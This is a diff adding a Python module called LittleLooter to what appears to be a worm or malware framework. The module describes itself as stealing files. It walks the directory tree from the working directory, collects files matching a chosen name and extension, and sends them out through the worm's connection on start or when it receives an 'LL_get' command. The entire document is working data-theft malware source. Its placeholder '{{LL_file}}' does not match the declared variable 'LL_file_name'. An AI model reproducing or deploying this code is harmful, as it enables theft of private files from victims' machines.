@@ -1,0 +1,56 @@
+#!name##LittleLooter
+#!types##module
+#!info##It searches files in directories going down the tree and steals files with the specified extension or name.
+#!reqVar##LL_file_name##Text which is in the file name. "*" means all file.##str
+#!setVar##LL_file_name##*##str
+#!reqVar##LL_fext##Downloadable file extensions. ex. 'jpg'##str
+#!setVar##LL_fext##jpg##str
+
+import os
+from time import sleep
+
+class LittleLooter:
+    MTYPES = "mal"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.text = "{{LL_file}}"
+        self.fext = "." + "{{LL_fext}}".lstrip(".")
+        self.targets = set()
+
+    
+    def find_files(self) -> None:
+        for root, dirs, files in os.walk(os.getcwd()):
+            for f in files:
+                file = os.path.splitext(f)
+                if self.text != "*":
+                    if self.text in file[0]:
+                        if self.fext == file[1]:
+                            self.targets.add(os.path.join(root, f))
+                else:
+                    if self.fext == file[1]:
+                        self.targets.add(os.path.join(root, f))
+        self.targets = list(self.targets)
+    
+    def send_files(self) -> None:
+        if len(self.targets) < 1:
+            return
+        if not self.worm.is_conn:
+            return
+        for tar in self.targets:
+            self.worm.send_file(tar)
+            sleep(0.1)
+        self.worm.send_msg("Send all files")
+    
+    def execute(self) -> None:
+        pass
+
+    def exec_cmd(self, cmd: dict) -> None:
+        match cmd["cmd"]:
+            case "LL_get":
+                self.send_files()
+        
+    def start(self) -> None:
+        self.find_files()
+        self.send_files()
+
+    
